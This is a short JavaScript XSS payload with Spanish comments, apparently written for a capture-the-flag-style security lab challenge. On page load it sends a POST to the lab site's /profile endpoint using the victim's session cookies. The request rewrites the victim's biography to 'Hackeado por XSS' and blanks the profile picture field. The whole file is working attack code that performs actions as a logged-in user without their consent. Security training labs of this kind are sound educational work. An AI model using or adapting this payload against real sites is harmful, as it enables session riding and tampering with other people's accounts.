// Esperar a que el DOM esté completamente cargado
document.addEventListener('DOMContentLoaded', function() {
    // Crear el formulario con los datos necesarios
    const formData = new FormData();
    formData.append('bio', 'Hackeado por XSS'); // Texto que quieres poner en la biografía
    formData.append('profile_pic', ''); // Campo vacío para la imagen de perfil

    // Realizar la petición POST al endpoint del perfil
    fetch('https://chl-019332a5-d76a-4573-9d47-ba890a04899a-blog-hacklab-v2.softwareseguro.com.ar/profile', {
        method: 'POST',
        headers: {
            // No especificar Content-Type, el navegador lo establecerá automáticamente con el boundary correcto
        },
        body: formData,
        credentials: 'include' // Esto incluye las cookies de sesión automáticamente
    })
    .then(response => {
        if (response.ok) {
            console.log('Biografía cambiada exitosamente');
            // Opcional: Redirigir o mostrar algún mensaje
        } else {
            console.error('Error al cambiar la biografía');
        }
    })
    .catch(error => {
        console.error('Error en la petición:', error);
    });
});
